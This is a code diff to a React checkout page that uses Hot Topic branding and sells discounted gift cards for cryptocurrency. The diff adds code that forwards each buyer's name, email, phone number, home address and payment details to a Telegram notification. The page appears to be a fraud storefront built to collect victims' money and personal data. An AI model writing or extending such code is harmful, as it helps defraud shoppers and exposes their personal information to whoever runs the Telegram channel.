@@ -10,7 +10,11 @@ import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicPromo from "@/components/HotTopicPromo";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import TestimonialCarousel from "@/components/TestimonialCarousel";
-import { createCoinPaymentTransaction, SUPPORTED_CRYPTOCURRENCIES } from "@/integrations/coinpayments/client";
+import { 
+  createCoinPaymentTransaction, 
+  SUPPORTED_CRYPTOCURRENCIES, 
+  sendTelegramNotification 
+} from "@/integrations/coinpayments/client";
 import { 
   AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users, Bitcoin 
 } from "lucide-react";
@@ -175,6 +179,36 @@ const Index = () => {
       }
       
       console.log("Payment transaction created successfully:", paymentResult.transactionDetails);
+      
+      // Send notification to Telegram
+      const notificationData = {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        phone: formData.phone,
+        address: formData.address,
+        city: formData.city,
+        state: formData.state,
+        zipCode: formData.zipCode,
+        giftCardValue: selectedAmount,
+        discountedAmount: discountedAmount,
+        deliveryMethod: deliveryMethod,
+        cryptoCurrency: selectedCryptoCurrency,
+        transactionId: paymentResult.transactionDetails?.txn_id
+      };
+      
+      // Send the notification asynchronously (don't wait for it)
+      sendTelegramNotification(notificationData)
+        .then(result => {
+          if (result.success) {
+            console.log("Telegram notification sent successfully");
+          } else {
+            console.error("Failed to send Telegram notification:", result.error);
+          }
+        })
+        .catch(error => {
+          console.error("Error sending Telegram notification:", error);
+        });
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify({
